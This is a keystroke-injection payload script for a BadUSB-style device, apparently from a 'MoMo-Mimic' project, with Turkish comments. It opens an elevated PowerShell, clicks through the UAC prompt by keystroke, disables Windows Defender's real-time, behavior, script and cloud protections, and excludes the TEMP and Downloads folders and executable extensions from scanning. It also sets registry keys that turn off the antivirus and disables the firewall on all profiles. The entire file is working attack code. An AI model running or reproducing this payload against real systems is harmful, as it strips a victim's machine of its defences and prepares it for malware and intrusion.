// ═══════════════════════════════════════════════════════════════════════════
// Payload: win_disable_defender.js
// Target:  Windows 10/11 (Admin gerekli)
// Time:    ~12 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: Windows Defender ve güvenlik özelliklerini devre dışı bırakır
// - Real-time protection
// - Cloud protection
// - Tamper protection (gerekirse)
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN ADMIN POWERSHELL                                           │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-r");
delay(500);
type("powershell Start-Process powershell -Verb runAs");
press("ENTER");
delay(2500);

// UAC onayı
press("LEFT");
delay(100);
press("ENTER");
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: DISABLE REAL-TIME PROTECTION                                    │
// └─────────────────────────────────────────────────────────────────────────┘
type("Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue");
press("ENTER");
delay(1000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: DISABLE ADDITIONAL PROTECTIONS                                  │
// └─────────────────────────────────────────────────────────────────────────┘
// Behavior Monitoring
type("Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// Block at First Seen
type("Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// IOAV Protection (Office dosyaları için)
type("Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// Script Scanning
type("Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 5: DISABLE CLOUD PROTECTION                                        │
// └─────────────────────────────────────────────────────────────────────────┘
type("Set-MpPreference -MAPSReporting Disabled -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

type("Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 6: ADD EXCLUSIONS                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
// Temp klasörünü hariç tut
type("Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// Downloads klasörünü hariç tut
type("Add-MpPreference -ExclusionPath $env:USERPROFILE\\Downloads -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// .exe, .ps1, .bat uzantılarını hariç tut
type("Add-MpPreference -ExclusionExtension '.exe','.ps1','.bat','.vbs' -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 7: DISABLE VIA REGISTRY (BACKUP METHOD)                            │
// └─────────────────────────────────────────────────────────────────────────┘
type("Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Force -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

type("Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Force -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 8: DISABLE WINDOWS FIREWALL (OPTIONAL)                             │
// └─────────────────────────────────────────────────────────────────────────┘
type("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 9: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
delay(500);
type("exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ NOTES                                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// - Windows 11'de Tamper Protection aktifse bazı ayarlar çalışmayabilir
// - Tamper Protection GUI'den manuel kapatılmalı
// - Değişiklikler geçici olabilir, kalıcı için GPO gerekli

